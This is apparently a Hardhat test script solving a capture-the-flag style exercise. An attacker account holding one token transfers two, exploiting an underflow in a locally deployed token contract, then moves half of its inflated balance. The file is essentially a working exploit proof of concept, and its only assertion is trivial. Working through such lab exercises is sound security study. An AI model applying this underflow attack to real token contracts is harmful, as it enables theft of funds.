const { expect } = require("chai");
const { ethers } = require("hardhat");
const { Contract } = require("hardhat/internal/hardhat-network/stack-traces/model");

describe("Token Attacking contract", function () {
  it("Deployment should work, n'est pas?", async function () {

    var assert = require('assert');

    //Contract.address
    //const accounts = await ethers.provider.listAccounts();
    //console.log(accounts);
    const [deployer,attacker, attacker2] = await ethers.getSigners();
    console.log(`Deployer/Owner address : ${deployer.address}`);
    console.log(`Attacker address ${attacker.address}`);
    console.log('');
    const TVContractFactory = await ethers.getContractFactory('contracts/4_Token.sol:Token');
    const tvcontract = await TVContractFactory.deploy(1000);//overrides); //"meep",{value: { BigNumber: "1" }});
    await tvcontract.deployed();
    console.log('Token contract deployed to:', tvcontract.address);
    const initialbalance = await tvcontract.totalSupply();
    console.log('Initial balance:', initialbalance);

    await tvcontract.transfer(attacker.address,1);
    console.log('Balance of owner     : ', await tvcontract.balanceOf(deployer.address));
    console.log('Balance of attacker  : ',  await tvcontract.balanceOf(attacker.address));
    await tvcontract.connect(attacker).transfer(attacker2.address,2);
    console.log('Balance of owner     : ', await tvcontract.balanceOf(deployer.address));
    console.log('Balance of attacker  : ',  await tvcontract.balanceOf(attacker.address));
    console.log('Balance of attacker 2: ',  await tvcontract.balanceOf(attacker2.address));
    var bn = (await tvcontract.balanceOf(attacker.address)).div(2);
    await tvcontract.connect(attacker).transfer(attacker2.address,bn);
    console.log('Balance of owner     : ', await tvcontract.balanceOf(deployer.address));
    console.log('Balance of attacker  : ',  await tvcontract.balanceOf(attacker.address));
    console.log('Balance of attacker 2: ',  await tvcontract.balanceOf(attacker2.address));




    expect('0').to.equal('0');
    });
});    